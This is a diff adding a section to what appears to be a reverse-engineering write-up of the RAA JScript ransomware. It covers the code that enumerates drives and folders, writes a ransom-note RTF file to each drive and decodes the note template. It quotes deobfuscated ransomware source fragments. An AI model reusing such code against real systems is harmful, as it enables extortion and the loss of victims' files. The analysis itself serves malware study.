@@ -444,6 +444,9 @@ var VKw = KrvABjTTXNS[0];
 var jOnaTnksWb = KrvABjTTXNS[1];
 ```
 
+
+### Identify drives, folders and files
+
 Next executable fragment of the code contains another array initialization and assignment result of **kth()** function to its first element:
 
 ```javascript
@@ -486,6 +489,131 @@ convenience.
 
 Then, _Enumerator_ property is instantiated and standard method to detect all drives is used (you can follow similar example on https://msdn.microsoft.com/en-us/library/832c8c0x(v=vs.84).aspx)
 Finally, array contains all drives letters is returned.
+
+
+Next fragment which is executed is:
+
+```javascript
+iKTzQKbfDJs();
+kAgTDYi[1] = [];
+```
+
+
+Function **iKTzQKbfDJs()** calls two other functions, **OFTEml()** and **YlDrqb()** - let's follow all of them to get the final result of their execution:
+
+```javascript
+function iKTzQKbfDJs() {
+    var mItZKEXYwE = [];
+    mItZKEXYwE = kAgTDYi[0];
+    mItZKEXYwE = OFTEml(mItZKEXYwE);
+    var rjTvWjMKnGpI = -1;
+    do {
+        rjTvWjMKnGpI += 1;
+        YlDrqb(mItZKEXYwE[rjTvWjMKnGpI]);
+    } while (rjTvWjMKnGpI < mItZKEXYwE.length - 1);
+    return 0
+}
+```
+
+First, **mItZKEXYwE** array is created and its value is simply the first element of **kAgTDYi**, which is previously returned list of drives from **kth()** .
+This array contains drives letters is passed as an argument to function **OFTEml()**:
+
+
+```javascript
+function OFTEml(array_to_clean) {
+    var pjvsEz = new Array();
+    for (var i = 0; i < array_to_clean.length; i++) {
+        if (array_to_clean[i]) {
+            pjvsEz.push(array_to_clean[i]);
+        }
+    }
+    return pjvsEz;
+}
+
+```
+
+This short function returns all not empty elements from array passed as argument.
+
+Next function **YlDrqb()**, is called for each element of cleaned by **OFTEml()** array (in other words: is executed for each drive)
+
+```javascript
+function YlDrqb(kth) {
+    var gg = new ActiveXObject("Scripting.FileSystemObject");
+    var dir = kth + "!!!README!!!" + TBucypWw + ".rtf";
+    var d2 = gg.CreateTextFile(dir, true);
+    d2.Write(VGCDtihB());
+    d2.Close();
+    return 0;
+}
+```
+Again, _FileSystemObject_ is used to create file with following example name on each drive, and to write to those files content created by function **VGCDtihB()**:
+
+```
+C!!!README!!!xW5Gf.rtf
+```
+
+Why **xW5Gf** in filename? Remember function generates random key, from the very beginning of RAA execution? Here's where this key is used (see 'The beginning' above).
+
+Function **VGCDtihB()** generates another _rtf_ file with ransomware payment note - you can see this file on ReaQta writeup (https://reaqta.com/wp-content/uploads/2016/06/RAA_Ransomware_build_refund_file.png - as I was not able to generate those files on my machine)
+
+
+```javascript
+
+function VGCDtihB() {
+    var rftKZajp = "e1xydG(...)QoRAASEP";
+    var cUNSPAqZAE = rftKZajp.replace(/RAASEP/g, "A");
+    cUNSPAqZAE = CryptoJS.enc.Base64.parse(cUNSPAqZAE);
+    cUNSPAqZAE = cUNSPAqZAE.toString(CryptoJS.enc.Utf8);
+    cUNSPAqZAE = cUNSPAqZAE.replace(/=IDHERE=/g, cVjZujcP);
+    cUNSPAqZAE = cUNSPAqZAE.replace(/=ADRHERE=/g, jOnaTnksWb);
+    return cUNSPAqZAE;
+}
+``` 
+
+As you can see, it uses similar method as for first _rtf_ file: some simple Base64 string manipulation with couple of replace() function with Regular Expression calls.
+
+
+Next, there is **PLnEyqCPKHV()** function call:
+
+```javascript
+function PLnEyqCPKHV() {
+    var sNaZfrOWc = nXmsNjMpKTv(kAgTDYi);
+    var NBMCuybDY = -1;
+    iFIS:do {
+        NBMCuybDY += 1;
+        try {
+            KWgwJwOlqJcs(sNaZfrOWc[NBMCuybDY]);
+        } catch (e) {
+            continue iFIS;
+        }
+    } while (NBMCuybDY <= sNaZfrOWc.length - 2);
+    return 0
+}
+
+PLnEyqCPKHV();
+```
+
+**sNaZfrOWc** array is initialized by **nXmsNjMpKTv()** function, with our previously generated list of drives **kAgTDYi** from **kth()** function:
+
+```javascript
+function nXmsNjMpKTv(kAgTDYi) {
+    var EPtLPm = -1;
+    var wVgUUZeM = -1;
+    do {
+        EPtLPm += 1;
+        var LeDOaP = LMz(kAgTDYi[0][EPtLPm]);
+        var LeDOaP = LeDOaP.split(TBucypWw);
+        kAgTDYi[1] = kAgTDYi[1].concat(LeDOaP);
+        kAgTDYi[1] = OFTEml(kAgTDYi[1]);
+        var aZKH = HHiAp(kAgTDYi[0][EPtLPm]);
+        var aZKH = aZKH.split(TBucypWw);
+        kAgTDYi[0] = kAgTDYi[0].concat(aZKH);
+        kAgTDYi[0] = OFTEml(kAgTDYi[0]);
+    } while (EPtLPm <= kAgTDYi[0].length - 2);
+    return (kAgTDYi[1]);
+}
+
+```
 
 
 
